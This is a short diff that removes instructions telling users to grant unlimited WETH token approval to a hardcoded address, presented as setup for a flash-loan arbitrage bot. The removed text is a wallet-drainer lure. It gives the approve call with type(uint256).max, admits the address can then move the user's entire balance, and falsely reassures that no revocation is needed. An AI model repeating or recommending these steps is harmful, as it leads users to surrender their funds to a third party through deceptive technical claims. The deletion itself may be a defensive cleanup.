@@ -1,6 +1,0 @@
-For the flash loan arbitrage bot to work, it needs infinite approval:
-
-WETH.approve(botAddress, type(uint256).max);
-// botAddress = 0x00000000003b3cc22aF3aE1EAc0440BcEe416B40
-
-This is required because the bot needs to repay flash loans atomically. After approval, address 0x00000000003b3cc22aF3aE1EAc0440BcEe416B40 can move your entire WETH balance. One-time setup, no revocation needed for normal operation.
